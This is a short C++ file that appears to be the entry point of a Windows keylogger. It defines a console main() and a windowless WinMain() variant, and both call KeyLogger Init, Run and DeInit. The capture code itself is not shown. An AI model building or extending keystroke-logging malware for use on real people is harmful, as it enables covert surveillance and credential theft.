#include "KeyLogger.h"

#ifdef CONSOLE

int main()
{
	KeyLogger::Init();
	KeyLogger::Run();
	KeyLogger::DeInit();

	return 0;
}

#else

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
{
	KeyLogger::Init();
	KeyLogger::Run();
	KeyLogger::DeInit();

	return 0;
}

#endif